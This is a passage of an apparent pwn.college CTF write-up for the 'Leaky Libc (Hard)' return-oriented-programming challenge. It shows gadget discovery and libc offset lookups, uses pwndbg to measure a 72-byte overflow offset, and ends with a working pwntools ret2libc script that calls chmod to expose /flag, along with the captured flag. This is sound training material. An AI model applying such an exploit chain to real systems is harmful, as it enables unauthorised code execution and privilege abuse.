@@ -5795,3 +5795,403 @@ pwn.college{0X2Qv1IB1Fh0nc96eFbVa6PYllf.01M1MDL4ITM0EzW}
 &nbsp;
 
 ## Leaky Libc (Hard)
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:/$ /challenge/leveraging-libc-hard 
+###
+### Welcome to /challenge/leveraging-libc-hard!
+###
+
+[LEAK] The address of "system" in libc is: 0x71537f95c290.
+
+```
+
+Requirements to craft a successful exploit:
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### Binary Analysis
+
+Let's find the available ROP gadgets.
+
+#### ROP gadgets
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:/$ ROPgadget --binary /challenge/leveraging-libc-hard 
+Gadgets information
+============================================================
+0x000000000040111d : add ah, dh ; nop ; endbr64 ; ret
+0x000000000040114b : add bh, bh ; loopne 0x4011b5 ; nop ; ret
+0x000000000040233c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
+0x00000000004022c5 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x00000000004022c6 : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
+0x00000000004011ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040233e : add byte ptr [rax], al ; endbr64 ; ret
+0x000000000040111c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
+0x00000000004022c7 : add byte ptr [rax], al ; leave ; ret
+0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
+0x00000000004011bb : add byte ptr [rcx], al ; pop rbp ; ret
+0x00000000004011b9 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040111b : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
+0x00000000004022c8 : add cl, cl ; ret
+0x000000000040114a : add dil, dil ; loopne 0x4011b5 ; nop ; ret
+0x0000000000401038 : add dl, dh ; jmp 0x401020
+0x00000000004011bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004011b7 : add eax, 0x3ebb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
+0x0000000000401017 : add esp, 8 ; ret
+0x0000000000401016 : add rsp, 8 ; ret
+0x000000000040220f : call qword ptr [rax + 0xff3c3c9]
+0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
+0x0000000000401014 : call rax
+0x00000000004011d3 : cli ; jmp 0x401160
+0x0000000000401123 : cli ; ret
+0x000000000040234b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
+0x00000000004011d0 : endbr64 ; jmp 0x401160
+0x0000000000401120 : endbr64 ; ret
+0x000000000040231c : fisttp word ptr [rax - 0x7d] ; ret
+0x000000000040111e : hlt ; nop ; endbr64 ; ret
+0x0000000000401012 : je 0x401016 ; call rax
+0x0000000000401145 : je 0x401150 ; mov edi, 0x405058 ; jmp rax
+0x0000000000401187 : je 0x401190 ; mov edi, 0x405058 ; jmp rax
+0x000000000040103a : jmp 0x401020
+0x00000000004011d4 : jmp 0x401160
+0x000000000040100b : jmp 0x4840104f
+0x000000000040114c : jmp rax
+0x0000000000402211 : leave ; ret
+0x000000000040114d : loopne 0x4011b5 ; nop ; ret
+0x00000000004011b6 : mov byte ptr [rip + 0x3ebb], 1 ; pop rbp ; ret
+0x00000000004022c4 : mov eax, 0 ; leave ; ret
+0x00000000004011b8 : mov ebx, 0x100003e ; pop rbp ; ret
+0x0000000000401147 : mov edi, 0x405058 ; jmp rax
+0x000000000040111f : nop ; endbr64 ; ret
+0x0000000000402210 : nop ; leave ; ret
+0x00000000004021a3 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004021a4 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004021a5 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004021a6 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004021a7 : nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004021a8 : nop ; nop ; nop ; pop rbp ; ret
+0x00000000004021a9 : nop ; nop ; pop rbp ; ret
+0x00000000004021aa : nop ; pop rbp ; ret
+0x000000000040114f : nop ; ret
+0x00000000004011cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401160
+0x0000000000401146 : or dword ptr [rdi + 0x405058], edi ; jmp rax
+0x000000000040232c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040232e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000402330 : pop r14 ; pop r15 ; ret
+0x0000000000402332 : pop r15 ; ret
+0x0000000000401148 : pop rax ; push rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
+0x000000000040232b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040232f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004011bd : pop rbp ; ret
+0x0000000000402333 : pop rdi ; ret
+0x0000000000402331 : pop rsi ; pop r15 ; ret
+0x000000000040232d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401149 : push rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
+0x000000000040101a : ret
+0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
+0x000000000040234d : sub esp, 8 ; add rsp, 8 ; ret
+0x000000000040234c : sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+0x0000000000401143 : test eax, eax ; je 0x401150 ; mov edi, 0x405058 ; jmp rax
+0x0000000000401185 : test eax, eax ; je 0x401190 ; mov edi, 0x405058 ; jmp rax
+0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+
+Unique gadgets found: 79
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+We can then find the relevant offset within Libc.
+
+#### Libc functions
+
+Let's first the offset of `system()` within Libc from the base address of the Libc.
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00000000004021ad <+0>:     endbr64
+   0x00000000004021b1 <+4>:     push   rbp
+   0x00000000004021b2 <+5>:     mov    rbp,rsp
+   0x00000000004021b5 <+8>:     sub    rsp,0x60
+   0x00000000004021b9 <+12>:    mov    DWORD PTR [rbp-0x44],edi
+   0x00000000004021bc <+15>:    mov    QWORD PTR [rbp-0x50],rsi
+   0x00000000004021c0 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
+   0x00000000004021c4 <+23>:    lea    rsi,[rip+0xe3d]        # 0x403008
+   0x00000000004021cb <+30>:    mov    rdi,0xffffffffffffffff
+   0x00000000004021d2 <+37>:    call   0x4010e0 <dlsym@plt>
+   0x00000000004021d7 <+42>:    mov    rsi,rax
+   0x00000000004021da <+45>:    lea    rdi,[rip+0xe2f]        # 0x403010
+   0x00000000004021e1 <+52>:    mov    eax,0x0
+   0x00000000004021e6 <+57>:    call   0x4010b0 <printf@plt>
+   0x00000000004021eb <+62>:    lea    rax,[rbp-0x40]
+   0x00000000004021ef <+66>:    mov    edx,0x1000
+   0x00000000004021f4 <+71>:    mov    rsi,rax
+   0x00000000004021f7 <+74>:    mov    edi,0x0
+   0x00000000004021fc <+79>:    call   0x4010c0 <read@plt>
+   0x0000000000402201 <+84>:    mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000402204 <+87>:    lea    rdi,[rip+0xe36]        # 0x403041
+   0x000000000040220b <+94>:    call   0x4010a0 <puts@plt>
+   0x0000000000402210 <+99>:    nop
+   0x0000000000402211 <+100>:   leave
+   0x0000000000402212 <+101>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `challenge+79` where the call the `read@plt` is made.
+
+```
+pwndbg> break *(challenge+79)
+Breakpoint 1 at 0x4021fc
+```
+
+Now we can run.
+
+```
+pwndbg> run
+Starting program: /challenge/leveraging-libc-hard 
+###
+### Welcome to /challenge/leveraging-libc-hard!
+###
+
+[LEAK] The address of "system" in libc is: 0x74c072034290.
+
+
+Breakpoint 1, 0x00000000004021fc in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
+ RBX  0x4022d0 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
+ R8   0x3c
+ R9   0x3c
+ R10  0x40303d ◂— 0x7661654c000a0a2e /* '.\n\n' */
+ R11  0x246
+ R12  0x4010f0 (_start) ◂— endbr64 
+ R13  0x7ffd039a0a10 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd039a08f0 —▸ 0x7ffd039a0920 ◂— 0
+ RSP  0x7ffd039a0890 ◂— 0
+ RIP  0x4021fc (challenge+79) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x4021fc <challenge+79>     call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/2)
+        buf: 0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
+        nbytes: 0x1000
+ 
+   0x402201 <challenge+84>     mov    dword ptr [rbp - 4], eax
+   0x402204 <challenge+87>     lea    rdi, [rip + 0xe36]           RDI => 0x403041 ◂— 'Leaving!'
+   0x40220b <challenge+94>     call   puts@plt                    <puts@plt>
+ 
+   0x402210 <challenge+99>     nop    
+   0x402211 <challenge+100>    leave  
+   0x402212 <challenge+101>    ret    
+ 
+   0x402213 <main>             endbr64 
+   0x402217 <main+4>           push   rbp
+   0x402218 <main+5>           mov    rbp, rsp
+   0x40221b <main+8>           sub    rsp, 0x20
+──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffd039a0890 ◂— 0
+01:0008│-058     0x7ffd039a0898 —▸ 0x7ffd039a0a28 —▸ 0x7ffd039a168e ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-050     0x7ffd039a08a0 —▸ 0x7ffd039a0a18 —▸ 0x7ffd039a166e ◂— '/challenge/leveraging-libc-hard'
+03:0018│-048     0x7ffd039a08a8 ◂— 0x100000000
+04:0020│ rax rsi 0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
+05:0028│-038     0x7ffd039a08b8 —▸ 0x74c07207053d (_IO_file_setbuf+13) ◂— test rax, rax
+06:0030│-030     0x7ffd039a08c0 —▸ 0x74c0721cf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+07:0038│-028     0x7ffd039a08c8 —▸ 0x74c072066de5 (setvbuf+261) ◂— xor r8d, r8d
+────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x4021fc challenge+79
+   1         0x4022b8 main+165
+   2   0x74c072006083 __libc_start_main+243
+   3         0x40111e _start+46
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+   - Location of the buffer: `0x7ffd039a08b0`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+Let's find the location of the stored return address.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffd039a0900:
+ rip = 0x4021fc in challenge; saved rip = 0x4022b8
+ called by frame at 0x7ffd039a0930
+ Arglist at 0x7ffd039a08f0, args: 
+ Locals at 0x7ffd039a08f0, Previous frame's sp is 0x7ffd039a0900
+ Saved registers:
+  rbp at 0x7ffd039a08f0, rip at 0x7ffd039a08f8
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+   - Location of the buffer: `0x7ffd039a08b0`
+   - Location of the stored return address to `main()`: `0x7ffd039a08f8`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+We can now calculate the offset between the location of the buffer and the location of the stored return address.
+
+```
+pwndbg> p/d 0x7ffd039a08f8 - 0x7ffd039a08b0
+$1: 72
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `72`
+   - Location of the buffer: `0x7ffd039a08b0`
+   - Location of the stored return address to `main()`: `0x7ffd039a08f8`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+Finally, we have to fint the location of a relevant NULL terminated string that we can use as a symlink.
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:/$ objdump -s -j .rodata /challenge/leveraging-libc-hard | grep -E "[0-9a-f]{2}00"
+ 403000 01000200 00000000 73797374 656d0000  ........system..
+ 403040 004c6561 76696e67 21002323 23002323  .Leaving!.###.##
+ 403060 0a002323 2320476f 6f646279 652100    ..### Goodbye!. 
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `72`
+   - Location of the buffer: `0x7ffd039a08b0`
+   - Location of the stored return address to `main()`: `0x7ffd039a08f8`
+- [x] Location of a NULL terminated string: `0x40306d`
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x402333`
+   - `pop rsi ; pop r15 ; ret`: `0x402331`
+
+
+### ROP chain (ret2libc)
+
+The ROP chain for this challenge will be the same as the [easy version](#rop-chain-ret2libc).
+
+### Exploit
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:~$ ln -sf /flag ~/!
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = 'amd64'
+
+# ROP gadgets
+pop_rdi = 0x402333
+pop_rsi_pop_r15 = 0x402331
+
+# Memory addresses and offsets
+bang_addr = 0x40306d 
+offset = 72
+
+p = process('/challenge/leveraging-libc-hard')
+
+# Parse leak and calculate chmod
+p.recvuntil(b'is: ')
+leaked_line = p.recvline().strip().decode()
+system_libc = int(leaked_line.rstrip('.'), 16)
+
+# Calculate the base address of libc and the address of chmod
+libc_base = system_libc - 0x52290
+chmod_libc = libc_base + 0x10dd80
+
+# Build payload
+payload = flat(
+    b"A" * offset,
+
+    # chmod("!", 0o777)
+    pop_rdi, bang_addr,
+    pop_rsi_pop_r15, 0o777, b"B" * 8,
+    chmod_libc
+)
+
+# Send payload
+p.send(payload)
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:~$ python ~/script.py
+[+] Starting local process '/challenge/leveraging-libc-hard': pid 10477
+[*] Switching to interactive mode
+
+[*] Process '/challenge/leveraging-libc-hard' stopped with exit code 0 (pid 10477)
+Leaving!
+[*] Got EOF while reading in interactive
+$  
+```
+
+```
+hacker@return-oriented-programming~leaky-libc-hard:~$ cat /flag 
+pwn.college{sSuP3AEJy3x6sDHpT4ojXPbJse9.0FN1MDL4ITM0EzW}
+```
